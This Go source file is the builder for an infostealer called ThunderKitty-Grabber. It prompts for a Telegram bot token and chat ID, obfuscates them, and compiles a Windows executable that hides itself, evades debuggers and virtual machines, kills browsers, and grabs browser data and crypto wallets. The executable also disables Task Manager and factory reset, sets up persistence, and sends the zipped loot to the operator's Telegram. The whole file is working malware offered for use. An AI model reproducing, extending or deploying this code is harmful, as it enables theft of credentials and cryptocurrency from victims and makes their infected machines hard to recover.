package main

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"text/template"
	"time"
	"github.com/fatih/color"
)

type Config struct {
	TeleBotToken        string
	TeleChatID          string
	EnableAntiDebug     bool
	EnableFakeError     bool
	EnableBrowsers      bool
	HideConsole         bool
	DisableFactoryReset bool
	DisableTaskManager  bool
	EnablePersistence   bool
	EnableTokenGrabber  bool
	EnableCryptoWallets bool
	Key                 byte
}

func EncryptString(input string, key byte) string {
	data := []byte(input)
	encrypted := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		shiftedKey := (key << 2) | (key >> 3)
		reversed := ((data[i] & 0xF0) >> 4) | ((data[i] & 0x0F) << 4)
		encrypted[i] = (reversed + byte(i)) ^ shiftedKey
	}
	return base64.StdEncoding.EncodeToString(encrypted)
}

func GenerateRandomVarName() string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	var name string
	for i := 0; i < 10; i++ {
		name += string(letters[rand.Intn(len(letters))])
	}
	return name
}

func buildExecutable(cfg Config) {
	randomTokenVar := GenerateRandomVarName()
	randomChatIDVar := GenerateRandomVarName()
	randomKeyVar := GenerateRandomVarName()

	const templateContent = `package main

import (
	"ThunderKitty-Grabber/utils/hideconsole"
	"ThunderKitty-Grabber/utils/antidbgandvm"
	"ThunderKitty-Grabber/utils/mutex"
	"ThunderKitty-Grabber/utils/fakeerror"
	"ThunderKitty-Grabber/utils/browsers"
	"ThunderKitty-Grabber/utils/disablefactoryreset"
	"ThunderKitty-Grabber/utils/taskmanager"
	"ThunderKitty-Grabber/utils/persistence"
	"ThunderKitty-Grabber/utils/cryptowallets" 
	"ThunderKitty-Grabber/utils/telegramsend"
    "os"
	"os/exec"
	"fmt"
	"sync"
	"encoding/base64"
	"archive/zip"
	"syscall"
	"io/fs"
	"io/ioutil"
	"path/filepath"
)

const (
	{{.RandomTokenVar}} = "{{.TeleBotToken}}"
	{{.RandomChatIDVar}}   = "{{.TeleChatID}}"
	{{.RandomKeyVar}}       = {{.Key}}
)

func DecryptString(input string, key byte) string {
	decoded, err := base64.StdEncoding.DecodeString(input)
	if err != nil {
		return ""
	}
	decrypted := make([]byte, len(decoded))
	for i := 0; i < len(decoded); i++ {
		shiftedKey := (key << 2) | (key >> 3)
		decrypted[i] = (decoded[i] ^ shiftedKey) - byte(i)
		decrypted[i] = ((decrypted[i] & 0xF0) >> 4) | ((decrypted[i] & 0x0F) << 4)
	}
	return string(decrypted)
}
func zipFolder(source string, target string) error {
	zipFile, err := os.Create(target)
	if err != nil {
		return err
	}
	defer zipFile.Close()
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()
	err = filepath.Walk(source, func(file string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		header.Name, err = filepath.Rel(filepath.Dir(source), file)
		if err != nil {
			return err
		}
		if info.IsDir() {
			header.Name += "/"
		}
		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}
		if !info.IsDir() {
			data, err := ioutil.ReadFile(file)
			if err != nil {
				return err
			}
			_, err = writer.Write(data)
			if err != nil {
				return err
			}
		}
		return nil
	})
	return err
}

func killBrowsers() {
	browsers := []string{
		"chrome.exe", "firefox.exe", "brave.exe", "opera.exe",
		"kometa.exe", "orbitum.exe", "centbrowser.exe", "7star.exe",
		"sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe",
		"msedge.exe", "uran.exe", "yandex.exe", "iridium.exe",
	}
	for _, browser := range browsers {
		cmd := exec.Command("taskkill", "/F", "/IM", browser)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Run()
	}
}

func main() {
	var wg sync.WaitGroup

	TelegramBotToken := DecryptString({{.RandomTokenVar}}, {{.RandomKeyVar}})
	TelegramChatId := DecryptString({{.RandomChatIDVar}}, {{.RandomKeyVar}})

	if {{.HideConsole}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			HideConsole.Hide()
		}()
	} else {
		fmt.Println("Hide console not enabled")
	}

	if {{.EnableAntiDebug}} {
		AntiDebugVMAnalysis.Check()
	} else {
		fmt.Println("Anti-debugging and VM analysis not enabled")
	}

	if {{.EnableFakeError}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			FakeError.Show()
		}()
	} else {
		fmt.Println("Fake error not enabled")
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		Mutex.Create()
	}()
	killBrowsers()

	if {{.EnableBrowsers}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			browsers.ThunderKittyGrab()
		}()
	} else {
		fmt.Println("Browser info grabbing not enabled")
	}

	if {{.EnableCryptoWallets}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			CryptoWallets.Run()
		}()
	} else {
		fmt.Println("Crypto Wallets not enabled")
	}

	if {{.DisableFactoryReset}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			FactoryReset.Disable()
		}()
	} else {
		fmt.Println("Factory reset not disabled")
	}

	if {{.DisableTaskManager}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			TaskManager.Disable()
		}()
	} else {
		fmt.Println("Task manager not disabled")
	}

	if {{.EnablePersistence}} {
		wg.Add(1)
		go func() {
			defer wg.Done()
			Persistence.Create()
		}()
	} else {
		fmt.Println("Persistence not enabled")
	}

	wg.Wait()

	sourceDir := os.TempDir() + "\\ThunderKitty" 
	targetZip := os.TempDir() + "\\ThunderKitty.zip"

	err := zipFolder(sourceDir, targetZip)
	if err != nil {
		fmt.Println("Error zipping folder:", err)
		return
	}
	
	err = requests.SendTelegramDocument(TelegramBotToken, TelegramChatId, targetZip)
	if err != nil {
		fmt.Println("Error sending document:", err)
	} else {
		fmt.Println("Document sent successfully.")
	}
}
`
	tmpl, err := template.New("main").Parse(templateContent)
	if err != nil {
		fmt.Println("Error parsing template:", err)
		return
	}

	file, err := os.Create("main.go")
	if err != nil {
		fmt.Println("Error creating main.go:", err)
		return
	}
	defer file.Close()

	err = tmpl.Execute(file, map[string]interface{}{
		"TeleBotToken":        cfg.TeleBotToken,
		"TeleChatID":          cfg.TeleChatID,
		"Key":                 cfg.Key,
		"RandomTokenVar":      randomTokenVar,
		"RandomChatIDVar":     randomChatIDVar,
		"RandomKeyVar":        randomKeyVar,
		"HideConsole":         cfg.HideConsole,
		"EnableAntiDebug":     cfg.EnableAntiDebug,
		"EnableFakeError":     cfg.EnableFakeError,
		"EnableBrowsers":      cfg.EnableBrowsers,
		"EnableCryptoWallets": cfg.EnableCryptoWallets,
		"DisableFactoryReset": cfg.DisableFactoryReset,
		"DisableTaskManager":  cfg.DisableTaskManager,
		"EnablePersistence":   cfg.EnablePersistence,
	})
	if err != nil {
		fmt.Println("Error executing template:", err)
		return
	}

	ldflags := "-s -w"
	if cfg.HideConsole {
		ldflags += " -H=windowsgui"
	}
	cmd := exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "ThunderKitty-Built.exe", "main.go")

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err = cmd.Run()
	if err != nil {
		fmt.Println("Error building executable:", err)
		return
	}

	fmt.Println("Build successful")
}

func main() {
	rand.Seed(time.Now().UnixNano())
	cyan := color.New(color.FgCyan).SprintFunc()

	fmt.Println(cyan("Please enter your Telegram Bot Token:"))
	var teleBotToken string
	fmt.Scanln(&teleBotToken)

	fmt.Println(cyan("Please enter your Telegram Chat ID:"))
	var teleChatID string
	fmt.Scanln(&teleChatID)

	var enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager, enablePersistence, enableCryptoWallets bool

	fmt.Println(cyan("Enable Anti-Debugging? (yes/no):"))
	var input string
	fmt.Scanln(&input)
	enableAntiDebug = input == "yes"

	fmt.Println(cyan("Enable Fake Error? (yes/no):"))
	fmt.Scanln(&input)
	enableFakeError = input == "yes"

	fmt.Println(cyan("Enable Browsers Info Grabbing? (yes/no):"))
	fmt.Scanln(&input)
	enableBrowsers = input == "yes"

	fmt.Println(cyan("Enable Crypto Wallets? (yes/no):"))
	fmt.Scanln(&input)
	enableCryptoWallets = input == "yes"

	fmt.Println(cyan("Hide Console? (yes/no):"))
	fmt.Scanln(&input)
	hideConsole = input == "yes"

	fmt.Println(cyan("Disable Factory Reset? (yes/no):"))
	fmt.Scanln(&input)
	disableFactoryReset = input == "yes"

	fmt.Println(cyan("Disable Task Manager? (yes/no):"))
	fmt.Scanln(&input)
	disableTaskManager = input == "yes"

	fmt.Println(cyan("Enable Persistence? (yes/no):"))
	fmt.Scanln(&input)
	enablePersistence = input == "yes"

	key := byte(rand.Intn(256))

	cfg := Config{
		TeleBotToken:        EncryptString(teleBotToken, key),
		TeleChatID:          EncryptString(teleChatID, key),
		EnableAntiDebug:     enableAntiDebug,
		EnableFakeError:     enableFakeError,
		EnableBrowsers:      enableBrowsers,
		HideConsole:         hideConsole,
		DisableFactoryReset: disableFactoryReset,
		DisableTaskManager:  disableTaskManager,
		EnablePersistence:   enablePersistence,
		EnableCryptoWallets: enableCryptoWallets,
		Key:                 key,
	}

	buildExecutable(cfg)
	fmt.Scanln()
}
